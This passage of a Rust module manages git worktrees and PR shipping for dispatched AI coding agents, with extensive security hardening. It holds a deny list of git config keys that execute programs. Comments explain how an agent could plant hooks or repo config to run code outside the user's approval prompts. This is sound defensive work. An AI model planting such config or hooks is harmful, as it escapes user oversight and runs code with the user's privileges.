//! Git and `gh` plumbing for task workspaces. Everything here is blocking process I/O and
//! must never run while the shared DB lock is held (see `ship::spawn_ship` for the
//! gather/compute/write split). The pure helpers — slugs, branch names, commit/PR text, URL
//! parsing — are unit-tested below; the process-driving ones are tested against a throwaway
//! local repo (no network: nothing in the tests pushes or calls `gh`).

use crate::db::queries::TaskWorkspace;
use crate::dispatch;
use crate::tags;
use serde::Serialize;
use std::path::{Path, PathBuf};
use std::process::Command;

/// Longest slug kept in a branch name; the task id suffix keeps branches unique regardless.
const MAX_SLUG_LEN: usize = 40;
/// GitHub rejects PR bodies past 65,536 characters; an agent's final message can be long.
const MAX_SUMMARY_CHARS: usize = 6_000;

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ShipStatus {
    /// Pushed, and a PR exists (opened now or already open from an earlier ship).
    Shipped,
    /// Nothing to commit and the branch has no commits beyond its base.
    NoChanges,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShipOutcome {
    pub status: ShipStatus,
    pub pr_url: Option<String>,
    pub committed: bool,
}

/// What a ship needs to know about the task besides its workspace.
pub struct ShipContext<'a> {
    pub title: &'a str,
    pub prompt: &'a str,
    pub agent: &'a str,
    pub model: &'a str,
    /// The agent's final message, used as the PR summary.
    pub summary: Option<&'a str>,
}

/// The hardened command every git/gh process Relay starts goes through (see `run`).
fn command(program: &str, dir: &Path, args: &[&str]) -> anyhow::Result<Command> {
    let executable = dispatch::resolve_executable(program)
        .ok_or_else(|| anyhow::anyhow!("`{program}` was not found on this machine's PATH"))?;
    let mut command = Command::new(executable);
    command
        .args(args)
        .current_dir(dir)
        // A Finder-launched app has launchd's bare PATH; git hooks and gh's credential
        // helpers need the user's real one (same reasoning as `agent_search_paths`).
        .env("PATH", dispatch::agent_path_env())
        // Never block on an interactive credential prompt nobody can see — fail instead.
        .env("GIT_TERMINAL_PROMPT", "0")
        .env("GH_PROMPT_DISABLED", "1")
        .env("NO_COLOR", "1")
        // Environment-scope config outranks every config file, and is inherited by the git
        // processes `gh` spawns. Both keys execute arbitrary commands and can be pointed at
        // agent-written files, so they are off for everything Relay runs (see `worktree_git`).
        .env("GIT_CONFIG_COUNT", "3")
        .env("GIT_CONFIG_KEY_0", "core.fsmonitor")
        .env("GIT_CONFIG_VALUE_0", "false")
        .env("GIT_CONFIG_KEY_1", "core.hooksPath")
        .env("GIT_CONFIG_VALUE_1", "/dev/null")
        // `ext::` remote URLs run a command; git refuses them by default, and this keeps a
        // repo-level override from turning them back on.
        .env("GIT_CONFIG_KEY_2", "protocol.ext.allow")
        .env("GIT_CONFIG_VALUE_2", "never");
    Ok(command)
}

fn run(program: &str, dir: &Path, args: &[&str]) -> anyhow::Result<String> {
    let output = command(program, dir, args)?.output()?;
    if output.status.success() {
        return Ok(String::from_utf8_lossy(&output.stdout).trim().to_string());
    }
    let stderr = String::from_utf8_lossy(&output.stderr).trim().to_string();
    let stdout = String::from_utf8_lossy(&output.stdout).trim().to_string();
    let detail = if stderr.is_empty() { stdout } else { stderr };
    anyhow::bail!("`{program} {}` failed: {detail}", args.join(" "))
}

fn git(dir: &Path, args: &[&str]) -> anyhow::Result<String> {
    run("git", dir, args)
}

/// The worktree's admin directory (`<common>/worktrees/<name>`), found through git's own
/// registry in the main repository rather than the worktree's `.git` file. That file sits
/// inside the agent's working folder, so an agent could repoint it at a repository it made up
/// whose config runs commands (`core.fsmonitor`, `core.sshCommand`, filter drivers…). The
/// registry lives in the user's checkout's `.git`, outside anything the agent works in.
fn trusted_git_dir(workspace: &TaskWorkspace) -> anyhow::Result<PathBuf> {
    let common = git(
        Path::new(&workspace.repo_root),
        &["rev-parse", "--path-format=absolute", "--git-common-dir"],
    )?;
    let worktree = Path::new(&workspace.worktree_path).canonicalize()?;
    for entry in std::fs::read_dir(Path::new(&common).join("worktrees"))? {
        let admin = entry?.path();
        // `gitdir` records the absolute path of the worktree's `.git` file. Compare its parent
        // (the worktree folder) rather than resolving the agent-writable `.git` entry itself.
        let Ok(recorded) = std::fs::read_to_string(admin.join("gitdir")) else {
            continue;
        };
        let recorded_worktree = Path::new(recorded.trim()).parent().map(Path::canonicalize);
        if let Some(Ok(recorded_worktree)) = recorded_worktree {
            if recorded_worktree == worktree {
                return Ok(admin);
            }
        }
    }
    anyhow::bail!(
        "git has no record of the worktree at {}; it may have been moved or tampered with",
        workspace.worktree_path
    )
}

/// Repository-level config entries (`local`/`worktree` scope, from `git config --show-scope
/// --list` output) that make git run a program. Agents dispatched *without* a worktree run in
/// the project checkout itself, where `.git/config` is inside their working folder, so any of
/// these could have been planted there. Global and system config are the user's own and are
/// trusted. `core.fsmonitor`/`core.hooksPath` are not listed: `run` force-disables both, and
/// tools like husky legitimately set a repo-level hooks path. Git LFS's own filter is allowed.
pub fn unsafe_repo_config(listing: &str) -> Vec<String> {
    listing
        .lines()
        .filter_map(|line| {
            let (scope, entry) = line.split_once('\t')?;
            if scope != "local" && scope != "worktree" {
                return None;
            }
            let (key, value) = entry.split_once('=').unwrap_or((entry, ""));
            let key_lower = key.to_lowercase();
            is_exec_config(&key_lower, value).then(|| key.to_string())
        })
        .collect()
}

fn is_exec_config(key: &str, value: &str) -> bool {
    let ends = |suffix: &str| key.ends_with(suffix);
    let starts = |prefix: &str| key.starts_with(prefix);
    if starts("filter.lfs.") {
        let value = value.trim();
        return !(value == "true" || value == "false" || value.starts_with("git-lfs "));
    }
    matches!(
        key,
        "core.sshcommand"
            | "core.gitproxy"
            | "core.askpass"
            | "core.pager"
            | "core.editor"
            | "core.alternaterefscommand"
            | "sequence.editor"
            | "diff.external"
            | "gpg.program"
            | "credential.helper"
            | "include.path"
            | "uploadpack.packobjectshook"
    ) || starts("includeif.")
        || starts("filter.")
        || (starts("gpg.") && ends(".program"))
        || (starts("credential.") && ends(".helper"))
        || (starts("diff.") && (ends(".command") || ends(".textconv")))
        || (starts("merge.") && ends(".driver"))
        || (starts("remote.") && (ends(".uploadpack") || ends(".receivepack")))
        || (starts("protocol.") && ends(".allow") && value.trim() == "always")
}

/// Fails closed, before any git command that could act on it, when repository-level config
/// would make git run a program (see `unsafe_repo_config`). Reading config runs nothing.
fn ensure_safe_config(listing: &str) -> anyhow::Result<()> {
    let found = unsafe_repo_config(listing);
    anyhow::ensure!(
        found.is_empty(),
        "refusing to run git: the repository's own config (.git/config) sets {} which can run \
         programs and could have been written by an agent. Review it, and move anything you \
         set yourself to your global git config (`git config --global`).",
        found.join(", ")
    );
    Ok(())
}

fn ensure_safe_worktree_config(workspace: &TaskWorkspace) -> anyhow::Result<()> {
    ensure_safe_config(&worktree_git(
        workspace,
        &["config", "--show-scope", "--list"],
    )?)
}

/// `run`, but for output that can be arbitrarily large (a branch's whole diff): stdout is kept
/// untrimmed and read up to `max_bytes`, after which git is stopped instead of buffering the
/// rest in memory. Returns the output and whether it was cut short.
fn run_capped(
    program: &str,
    dir: &Path,
    args: &[&str],
    max_bytes: usize,
) -> anyhow::Result<(String, bool)> {
    use std::io::Read;
    use std::process::Stdio;
    let mut child = command(program, dir, args)?
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;
    let (Some(stdout), Some(mut stderr)) = (child.stdout.take(), child.stderr.take()) else {
        let _ = child.kill();
        anyhow::bail!("`{program}` started without its output pipes");
    };
    // Drained on its own thread so a chatty stderr can't fill its pipe and stall the process
    // while stdout is still being read.
    let stderr_reader = std::thread::spawn(move || {
        let mut buffer = Vec::new();
        let _ = stderr.read_to_end(&mut buffer);
        buffer
    });
    let mut output = Vec::new();
    let read = stdout.take(max_bytes as u64 + 1).read_to_end(&mut output);
    let cut_short = output.len() > max_bytes;
    if cut_short || read.is_err() {
        let _ = child.kill();
    }
    let status = child.wait()?;
    let stderr = stderr_reader.join().unwrap_or_default();
    read?;
    if cut_short {
        output.truncate(max_bytes);
        return Ok((String::from_utf8_lossy(&output).into_owned(), true));
    }
    if !status.success() {
        let detail = String::from_utf8_lossy(&stderr).trim().to_string();
        anyhow::bail!("`{program} {}` failed: {detail}", args.join(" "));
    }
    Ok((String::from_utf8_lossy(&output).into_owned(), false))
}

/// The arguments that pin git to a task's worktree: `--git-dir` from `trusted_git_dir`, so
/// nothing the agent wrote in its folder decides which repository or config git uses.
fn worktree_git_args(workspace: &TaskWorkspace) -> anyhow::Result<Vec<String>> {
    let git_dir = trusted_git_dir(workspace)?;
    Ok(vec![
        format!("--git-dir={}", git_dir.display()),
        format!("--work-tree={}", workspace.worktree_path),
    ])
}

/// Runs git inside a task's worktree with the repository pinned to `trusted_git_dir`.
fn worktree_git(workspace: &TaskWorkspace, args: &[&str]) -> anyhow::Result<String> {
    let pinned = worktree_git_args(workspace)?;
    let mut full: Vec<&str> = pinned.iter().map(String::as_str).collect();
    full.extend_from_slice(args);
    run("git", Path::new(&workspace.worktree_path), &full)
}

/// `worktree_git` for the commit and push Relay makes on the agent's behalf, with hooks off:
/// hooks can live in tracked files the agent can edit (husky's `.husky/`, or any
/// `core.hooksPath` inside the repo), so running them would execute agent-written code with
/// the user's full privileges, outside the approval prompts that gate the agent's own
/// commands. `run` already forces `core.hooksPath=/dev/null`; `--no-verify` is belt-and-braces.
/// The repo's checks still run in CI on the PR.
fn worktree_git_without_hooks(workspace: &TaskWorkspace, args: &[&str]) -> anyhow::Result<String> {
    let mut full = args.to_vec();
    full.push("--no-verify");
    worktree_git(workspace, &full)
}

fn gh(dir: &Path, args: &[&str]) -> anyhow::Result<String> {
    run("gh", dir, args)
}

pub fn slugify(title: &str) -> String {
    let mut slug = String::new();
    for ch in title.to_lowercase().chars() {
        if ch.is_ascii_alphanumeric() {
            slug.push(ch);
        } else if !slug.is_empty() && !slug.ends_with('-') {
            slug.push('-');
        }
        if slug.len() >= MAX_SLUG_LEN {
            break;
        }
    }
    let slug = slug.trim_end_matches('-').to_string();
    if slug.is_empty() {
        "task".to_string()
    } else {
        slug
    }
}

fn short_id(task_id: &str) -> String {
    task_id
        .chars()
        .filter(char::is_ascii_alphanumeric)
        .take(8)
        .collect()
}

pub fn branch_name(title: &str, task_id: &str) -> String {
    format!("relay/{}-{}", slugify(title), short_id(task_id))
}

/// Conventional Commits type for a task, reusing the session tag heuristic. A fix wins over a
/// feature because "fix the add button" is a fix; anything unclassified is a chore.
pub fn commit_type(title: &str, prompt: &str) -> &'static str {
    let found = tags::classify(&format!("{title}\n{prompt}"));
    let has = |tag: &str| found.iter().any(|t| t == tag);
    if has("bugfix") {
        "fix"
    } else if has("feature") {
        "feat"
    } else if has("refactor") {
        "refactor"
    } else if has("test") {
        "test"
    } else if has("docs") {
        "docs"
    } else {
        "chore"
    }
}

/// `type: title`, with the title's first letter lowercased per Conventional Commits style and
/// any existing `type:` prefix respected rather than doubled.
pub fn conventional_title(title: &str, prompt: &str) -> String {
    let title = title.trim();
    if let Some((prefix, _)) = title.split_once(':') {
        let bare = prefix.split('(').next().unwrap_or(prefix);
        if !bare.is_empty() && bare.chars().all(|c| c.is_ascii_lowercase()) {
            return title.to_string();
        }
    }
    let mut chars = title.chars();
    let subject = match chars.next() {
        Some(first) => first.to_lowercase().collect::<String>() + chars.as_str(),
        None => "update".to_string(),
    };
    format!("{}: {subject}", commit_type(title, prompt))
}

pub fn commit_message(context: &ShipContext) -> String {
    format!(
        "{}\n\nDispatched by Relay ({} / {}).",
        conventional_title(context.title, context.prompt),
        context.agent,
        context.model
    )
}

fn truncate_chars(text: &str, max: usize) -> String {
    if text.chars().count() <= max {
        return text.to_string();
    }
    let cut: String = text.chars().take(max).collect();
    format!("{cut}\n\n…(truncated)")
}

pub fn pr_body(context: &ShipContext, branch: &str) -> String {
    let summary = context
        .summary
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .map(|s| truncate_chars(s, MAX_SUMMARY_CHARS))
        .unwrap_or_else(|| "_The agent did not leave a final summary._".to_string());
    format!(
        "## Summary\n\n{summary}\n\n## Task\n\n{}\n\n## How it was made\n\n\
         Dispatched from Relay to `{}` (model `{}`) on branch `{branch}`. \
         The agent's changes were committed and pushed automatically. Review before merging.\n",
        truncate_chars(context.prompt.trim(), MAX_SUMMARY_CHARS),
        context.agent,
        context.model,
    )
}

/// `gh pr create` prints the new PR's URL as its last stdout line (warnings go to stderr).
pub fn parse_pr_url(stdout: &str) -> Option<String> {
    stdout
        .lines()
        .rev()
        .map(str::trim)
        .find(|line| line.starts_with("https://") && line.contains("/pull/"))
        .map(str::to_string)
}

fn current_branch(repo: &Path) -> Option<String> {
    git(repo, &["symbolic-ref", "--quiet", "--short", "HEAD"])
        .ok()
        .filter(|b| !b.is_empty())
}

fn origin_default_branch(repo: &Path) -> Option<String> {
    git(
        repo,
        &[
            "symbolic-ref",
            "--quiet",
            "--short",
            "refs/remotes/origin/HEAD",
        ],
    )
    .ok()
    .and_then(|r| r.strip_prefix("origin/").map(str::to_string))
}

/// Creates the isolated worktree a task will run in. The branch starts from the project
/// checkout's current `HEAD` (committed state only — uncommitted edits in the main checkout
/// are deliberately not carried over), and the PR will target the branch that checkout is on.
pub fn prepare_workspace(
    worktrees_root: &Path,
    project_path: &str,
    task_id: &str,
    title: &str,
    auto_ship: bool,
    now: i64,
) -> anyhow::Result<TaskWorkspace> {
    let project = Path::new(project_path);
    anyhow::ensure!(
        project.is_dir(),
        "project folder {project_path} does not exist"
    );
    let repo_root = git(project, &["rev-parse", "--show-toplevel"]).map_err(|_| {
        anyhow::anyhow!(
            "{project_path} is not inside a git repository, so Relay can't open a PR for it"
        )
    })?;
    let repo_root = PathBuf::from(repo_root);
    // `worktree add` checks files out, which runs any configured smudge filter.
    ensure_safe_config(&git(&repo_root, &["config", "--show-scope", "--list"])?)?;
    git(&repo_root, &["rev-parse", "--verify", "HEAD"])
        .map_err(|_| anyhow::anyhow!("the repository has no commits yet; commit once first"))?;
    let base_branch = current_branch(&repo_root)
        .or_else(|| origin_default_branch(&repo_root))
        .ok_or_else(|| {
            anyhow::anyhow!("the project checkout is on a detached HEAD; check out a branch first")
        })?;

    // The project's subdirectory within its repo, as git itself sees it. Comparing path
    // strings instead breaks on symlinks and on macOS's case-insensitive paths, and a silent
    // fallback to the repo root would run the agent in the wrong folder.
    // `--show-prefix` ends in `/` ("web/"); trimmed so `work_dir` never carries a trailing
    // slash, which would defeat the exact-match cwd mapping at ingest.
    let prefix = git(project, &["rev-parse", "--show-prefix"])?;
    let relative = PathBuf::from(prefix.trim_end_matches('/'));

    let repo_name = repo_root
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("repo");
    let branch = branch_name(title, task_id);
    let worktree_path =
        worktrees_root.join(format!("{}-{}", slugify(repo_name), short_id(task_id)));
    std::fs::create_dir_all(worktrees_root)?;
    let worktree_str = worktree_path.to_string_lossy().to_string();
    git(
        &repo_root,
        &["worktree", "add", "-b", &branch, &worktree_str, "HEAD"],
    )?;
    let work_dir = worktree_path.join(relative);

    Ok(TaskWorkspace {
        task_id: task_id.to_string(),
        project_path: project_path.to_string(),
        repo_root: repo_root.to_string_lossy().to_string(),
        worktree_path: worktree_str,
        work_dir: work_dir.to_string_lossy().to_string(),
        branch,
        base_branch,
        auto_ship,
        ship_status: "pending".to_string(),
        ship_error: None,
        pr_url: None,
        last_shipped_at: None,
        removed_at: None,
        created_at: now,
    })
}

/// Re-creates a worktree that was removed (the conversation was shut down) so a retry can run
/// again on the same branch, and therefore keep updating the same PR. Returns whether it had
/// to recreate anything.
pub fn ensure_worktree(workspace: &TaskWorkspace) -> anyhow::Result<bool> {
    if Path::new(&workspace.worktree_path).is_dir() {
        return Ok(false);
    }
    let repo = Path::new(&workspace.repo_root);
    ensure_safe_config(&git(repo, &["config", "--show-scope", "--list"])?)?;
    // Drop git's bookkeeping for the vanished directory, or `worktree add` refuses the path.
    git(repo, &["worktree", "prune"])?;
    git(
        repo,
        &[
            "worktree",
            "add",
            &workspace.worktree_path,
            &workspace.branch,
        ],
    )?;
    Ok(true)
}

fn is_dirty(workspace: &TaskWorkspace) -> anyhow::Result<bool> {
    Ok(!worktree_git(workspace, &["status", "--porcelain"])?.is_empty())
}

/// Commits whatever the agent left uncommitted. Returns whether a commit was made.
pub fn commit_all(workspace: &TaskWorkspace, message: &str) -> anyhow::Result<bool> {
    if !is_dirty(workspace)? {
        return Ok(false);
    }
    worktree_git(workspace, &["add", "-A"])?;
    worktree_git_without_hooks(workspace, &["commit", "-m", message])?;
    Ok(true)
}

pub fn commits_ahead(workspace: &TaskWorkspace) -> anyhow::Result<i64> {
    let range = format!("{}..HEAD", workspace.base_branch);
    let count = worktree_git(workspace, &["rev-list", "--count", &range])?;
    Ok(count.parse().unwrap_or(0))
}

/// Commit → push → open (or find) the PR. Idempotent: shipping again after more turns pushes
/// the new commits to the same branch, which updates the existing PR.
pub fn ship(workspace: &TaskWorkspace, context: &ShipContext) -> anyhow::Result<ShipOutcome> {
    let worktree = Path::new(&workspace.worktree_path);
    anyhow::ensure!(
        worktree.is_dir(),
        "the task's worktree at {} no longer exists",
        workspace.worktree_path
    );
    // First, before `git status`/`add`/`push`, any of which can invoke filters or ssh.
    ensure_safe_worktree_config(workspace)?;
    let committed = commit_all(workspace, &commit_message(context))?;
    if commits_ahead(workspace)? == 0 {
        return Ok(ShipOutcome {
            status: ShipStatus::NoChanges,
            pr_url: workspace.pr_url.clone(),
            committed,
        });
    }

    let remotes = worktree_git(workspace, &["remote"])?;
    anyhow::ensure!(
        remotes.lines().any(|r| r.trim() == "origin"),
        "the repository has no `origin` remote to push to"
    );
    worktree_git_without_hooks(workspace, &["push", "-u", "origin", &workspace.branch])?;

    if workspace.pr_url.is_some() {
        return Ok(ShipOutcome {
            status: ShipStatus::Shipped,
            pr_url: workspace.pr_url.clone(),
            committed,
        });
    }
    let title = conventional_title(context.title, context.prompt);
    let body = pr_body(context, &workspace.branch);
    // gh runs git internally to find the repo; run it from the user's own checkout (same
    // repository, same remotes) rather than the agent's folder. `--head` names the branch, so
    // gh never needs the worktree.
    let repo_root = Path::new(&workspace.repo_root);
    let created = gh(
        repo_root,
        &[
            "pr",
            "create",
            "--base",
            &workspace.base_branch,
            "--head",
            &workspace.branch,
            "--title",
            &title,
            "--body",
            &body,
        ],
    );
    let pr_url = match created {
        Ok(stdout) => parse_pr_url(&stdout),
        // Most often "a pull request already exists" (opened by hand, or a previous ship that
        // pushed but crashed before recording the URL) — adopt it rather than failing.
        Err(create_error) => match gh(
            repo_root,
            &[
                "pr",
                "view",
                &workspace.branch,
                "--json",
                "url",
                "--jq",
                ".url",
            ],
        ) {
            Ok(url) if !url.is_empty() => Some(url),
            _ => return Err(create_error),
        },
    };
    Ok(ShipOutcome {
        status: ShipStatus::Shipped,
        pr_url,
        committed,
    })
}

/// Outcome of checking whether a folder is a GitHub repository `gh` can access.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum GithubCheck {
    /// `gh` can see it; `owner/name` as GitHub spells it.
    Verified(String),
    /// Definitively not: the folder is gone, isn't a git checkout, has no GitHub remote, or
    /// GitHub says the repository doesn't exist for this user.
    NotGithub(String),
    /// Couldn't tell — git or gh missing, gh logged out, offline. Callers keep whatever they
    /// recorded before rather than hiding a project over a transient failure.
    Inconclusive(String),
}

/// `owner/name` of every GitHub remote in a repository's own config (`git config --show-scope
/// --list` output), `origin` first, then the rest in config order, deduplicated. Remote names
/// may contain dots (`remote.<name>.url`), so the name is everything between the two.
pub fn github_remote_candidates(listing: &str) -> Vec<String> {
    let mut remotes: Vec<(String, String)> = Vec::new();
    for line in listing.lines() {
        let Some((scope, entry)) = line.split_once('\t') else {
            continue;
        };
        if scope != "local" && scope != "worktree" {
            continue;
        }
        let Some((key, value)) = entry.split_once('=') else {
            continue;
        };
        let Some(remote) = key
            .strip_prefix("remote.")
            .and_then(|rest| rest.strip_suffix(".url"))
        else {
            continue;
        };
        if let Some((owner, name)) = crate::projects::parse_github_repo(value) {
            remotes.push((remote.to_string(), format!("{owner}/{name}")));
        }
    }
    remotes.sort_by_key(|(remote, _)| remote != "origin");
    let mut seen = Vec::<String>::new();
    for (_, repo) in remotes {
        if !seen.iter().any(|s| s.eq_ignore_ascii_case(&repo)) {
            seen.push(repo);
        }
    }
    seen
}

/// GitHub remotes of a local folder, read from its config only — no network, and nothing that
/// could run a program (reading config never does; `run` force-disables fsmonitor). `None`
/// when the folder isn't inside a git checkout.
pub fn local_github_remotes(folder: &Path) -> Option<Vec<String>> {
    git(folder, &["rev-parse", "--is-inside-work-tree"]).ok()?;
    let listing = git(folder, &["config", "--show-scope", "--list"]).ok()?;
    Some(github_remote_candidates(&listing))
}

/// `nameWithOwner` from `gh repo view --json nameWithOwner` output, validated so nothing odd
/// GitHub (or a shim on PATH) prints is stored as a repository name.
pub fn parse_repo_view_json(stdout: &str) -> Option<String> {
    let value: serde_json::Value = serde_json::from_str(stdout.trim()).ok()?;
    let full = value.get("nameWithOwner")?.as_str()?;
    let (owner, name) = crate::projects::parse_bare_repo(full)?;
    Some(format!("{owner}/{name}"))
}

/// Whether `folder` is a git checkout of a GitHub repository the user's `gh` can access.
///
/// The folder is user-chosen or an agent's cwd, so its `.git/config` may be agent-written.
/// Nothing here runs git *operations* in it: the remotes are read from config, and `gh` is
/// asked about `owner/name` explicitly from a neutral directory, so gh never runs git in the
/// folder either (and its config can't redirect what gh talks to). Never panics; every failure
/// becomes a `NotGithub`/`Inconclusive` with a reason.
pub fn check_folder_github(folder: &Path) -> GithubCheck {
    if !folder.is_dir() {
        return GithubCheck::NotGithub("folder no longer exists".into());
    }
    if dispatch::resolve_executable("git").is_none() {
        return GithubCheck::Inconclusive("`git` was not found on PATH".into());
    }
    let Some(candidates) = local_github_remotes(folder) else {
        return GithubCheck::NotGithub("not a git checkout".into());
    };
    if candidates.is_empty() {
        return GithubCheck::NotGithub("no GitHub remote".into());
    }
    let neutral = std::env::temp_dir();
    let mut inconclusive = None;
    for candidate in &candidates {
        match gh(
            &neutral,
            &["repo", "view", candidate, "--json", "nameWithOwner"],
        ) {
            Ok(stdout) => match parse_repo_view_json(&stdout) {
                Some(repo) => return GithubCheck::Verified(repo),
                None => inconclusive = Some(format!("unexpected `gh repo view` output: {stdout}")),
            },
            // GitHub answers this for a repo that doesn't exist *or* that this user can't see.
            Err(error)
                if error
                    .to_string()
                    .contains("Could not resolve to a Repository") => {}
            Err(error) => inconclusive = Some(format!("{error:#}")),
        }
    }
    match inconclusive {
        Some(reason) => GithubCheck::Inconclusive(reason),
        None => GithubCheck::NotGithub(format!("gh can't access {}", candidates.join(" or "))),
    }
}

/// `gh repo clone owner/name <dest>` without submodules (their URLs come from the cloned
/// repo's `.gitmodules`, i.e. from whoever controls it). `repo` must already be validated
/// `owner/name` (see `projects::parse_github_repo`) and `dest` absolute, so neither can be
/// read as an option. Runs from `dest`'s parent; blocking, may take a while.
pub fn clone_github_repo(repo: &str, dest: &Path) -> anyhow::Result<()> {
    anyhow::ensure!(dest.is_absolute(), "clone destination must be absolute");
    let parent = dest
        .parent()
        .ok_or_else(|| anyhow::anyhow!("clone destination has no parent folder"))?;
    let dest = dest.to_string_lossy();
    gh(
        parent,
        &[
            "repo",
            "clone",
            repo,
            &dest,
            "--",
            "--no-recurse-submodules",
        ],
    )?;
    Ok(())
}

/// Removes a task's worktree once its work is safely on the branch. Leaves it in place (and
/// returns `false`) when it still holds uncommitted changes, so nothing is ever discarded.
/// The branch itself is kept: it backs the PR.
pub fn remove_worktree(workspace: &TaskWorkspace) -> anyhow::Result<bool> {
    let worktree = Path::new(&workspace.worktree_path);
    if !worktree.is_dir() {
        return Ok(true);
    }
    ensure_safe_worktree_config(workspace)?;
    if is_dirty(workspace)? {
        return Ok(false);
    }
    git(
        Path::new(&workspace.repo_root),
        &["worktree", "remove", &workspace.worktree_path],
    )?;
    Ok(true)
}

/// Throws away a workspace that was created but never used (its task failed to be recorded):
/// force-removes the worktree and deletes its branch. Only for that path — never for a
/// workspace an agent has worked in.
pub fn discard_workspace(workspace: &TaskWorkspace) -> anyhow::Result<()> {
    let repo = Path::new(&workspace.repo_root);
    git(
        repo,
        &["worktree", "remove", "--force", &workspace.worktree_path],
    )?;
    git(repo, &["branch", "-D", &workspace.branch])?;
    Ok(())
}

// --- A task branch's commits and diff (what a PR's Commits and Files changed tabs show) ---

/// Most commits listed for one branch (newest kept). GitHub's own PR commit list stops at 250.
const MAX_BRANCH_COMMITS: usize = 250;
/// Bytes of `git log` output read for the commit list; far beyond what 250 subjects need.
const MAX_LOG_BYTES: usize = 1_000_000;
/// Bytes of patch text read for a branch's diff. Past it git is stopped, the files seen so far
/// are kept and the diff is flagged truncated — a branch that commits a generated bundle or a
/// lockfile would otherwise ship megabytes over IPC.
const MAX_BRANCH_DIFF_BYTES: usize = 2_000_000;
/// Diff lines kept per file, matching the session diff cap (`commands::MAX_DIFF_LINES`).
/// Additions/deletions still count every line past it.
const MAX_FILE_DIFF_LINES: usize = 2_000;

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct CommitInfo {
    pub sha: String,
    pub short_sha: String,
    pub subject: String,
    pub author: String,
    /// Author date, unix seconds.
    pub timestamp: i64,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum FileStatus {
    Added,
    Modified,
    Deleted,
    Renamed,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum LineKind {
    Context,
    Add,
    Del,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct HunkLine {
    pub kind: LineKind,
    /// Line number on the base side; `None` for an added line.
    pub old_line: Option<u32>,
    /// Line number on the branch side; `None` for a deleted line.
    pub new_line: Option<u32>,
    pub content: String,
    /// git's `\ No newline at end of file` followed this line.
    pub no_newline: bool,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Hunk {
    /// The whole `@@ -a,b +c,d @@ context` line.
    pub header: String,
    pub old_start: u32,
    pub old_lines: u32,
    pub new_start: u32,
    pub new_lines: u32,
    pub lines: Vec<HunkLine>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct FileDiff {
    /// Path on the branch side (the base side's path for a deleted file).
    pub path: String,
    /// The base side's path, for renames only.
    pub old_path: Option<String>,
    pub status: FileStatus,
    pub additions: u32,
    pub deletions: u32,
    /// git reported "Binary files … differ": no hunks, no line counts.
    pub binary: bool,
    pub hunks: Vec<Hunk>,
    /// Some of this file's lines were left out (`MAX_FILE_DIFF_LINES`, or the whole diff hit
    /// `MAX_BRANCH_DIFF_BYTES` inside this file).
    pub truncated: bool,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct BranchDiff {
    pub files: Vec<FileDiff>,
    /// The diff was cut at `MAX_BRANCH_DIFF_BYTES`, so files after the last one listed are
    /// missing.
    pub truncated: bool,
}

/// Runs a read-only git command against a task's branch, through the same checks as every
/// other git call here. While the worktree exists git is pinned to it (`worktree_git_args`)
/// after `ensure_safe_worktree_config`; once it is gone (shut down, or deleted by hand) the
/// branch ref is read from the user's checkout at `repo_root`, after `ensure_safe_config` on
/// that repository. Only refs and objects are read: nothing is checked out or written.
fn read_branch(
    workspace: &TaskWorkspace,
    args: &[&str],
    max_bytes: usize,
) -> anyhow::Result<(String, bool)> {
    let worktree = Path::new(&workspace.worktree_path);
    if workspace.removed_at.is_none() && worktree.is_dir() {
        ensure_safe_worktree_config(workspace)?;
        let pinned = worktree_git_args(workspace)?;
        let mut full: Vec<&str> = pinned.iter().map(String::as_str).collect();
        full.extend_from_slice(args);
        return run_capped("git", worktree, &full, max_bytes);
    }
    let repo = Path::new(&workspace.repo_root);
    ensure_safe_config(&git(repo, &["config", "--show-scope", "--list"])?)?;
    run_capped("git", repo, args, max_bytes)
}

/// The commits on the task branch that its base doesn't have (`base..branch`), oldest first
/// like a PR's Commits tab. Committed work only: anything the agent left uncommitted in the
/// worktree isn't on the branch yet, so it isn't in the PR either.
pub fn branch_commits(workspace: &TaskWorkspace) -> anyhow::Result<Vec<CommitInfo>> {
    let range = format!("{}..{}", workspace.base_branch, workspace.branch);
    let max_count = format!("--max-count={MAX_BRANCH_COMMITS}");
    let (output, _) = read_branch(
        workspace,
        &[
            "log",
            "--no-color",
            "--no-decorate",
            // `log.showSignature` in the user's config would run gpg for every commit.
            "--no-show-signature",
            "--reverse",
            &max_count,
            "--format=%H%x1f%h%x1f%an%x1f%at%x1f%s%x1e",
            &range,
            "--",
        ],
        MAX_LOG_BYTES,
    )?;
    Ok(parse_commit_log(&output))
}

/// Parses `git log` output in the `%x1f`-separated, `%x1e`-terminated format above. A record
/// that doesn't have all five fields (the output was cut mid-record) is skipped.
pub fn parse_commit_log(output: &str) -> Vec<CommitInfo> {
    output
        .split('\x1e')
        .filter_map(|record| {
            let mut fields = record.trim_start_matches('\n').split('\x1f');
            let sha = fields.next()?.to_string();
            let short_sha = fields.next()?.to_string();
            let author = fields.next()?.to_string();
            let timestamp = fields.next()?.parse().ok()?;
            let subject = fields.next()?.to_string();
            (!sha.is_empty()).then_some(CommitInfo {
                sha,
                short_sha,
                subject,
                author,
                timestamp,
            })
        })
        .collect()
}

/// The branch's changes against the point it forked from its base (`base...branch`, the
/// diff a PR's Files changed tab shows), parsed per file.
pub fn branch_diff(workspace: &TaskWorkspace) -> anyhow::Result<BranchDiff> {
    let range = format!("{}...{}", workspace.base_branch, workspace.branch);
    let (output, cut_short) = read_branch(
        workspace,
        &[
            "diff",
            "--no-color",
            // External diff drivers and textconv filters are programs named by config.
            "--no-ext-diff",
            "--no-textconv",
            "--find-renames",
            // Pinned so the user's diff config (`diff.noprefix`, `diff.mnemonicPrefix`,
            // `diff.relative`, `diff.submodule`) can't change the format being parsed.
            "--src-prefix=a/",
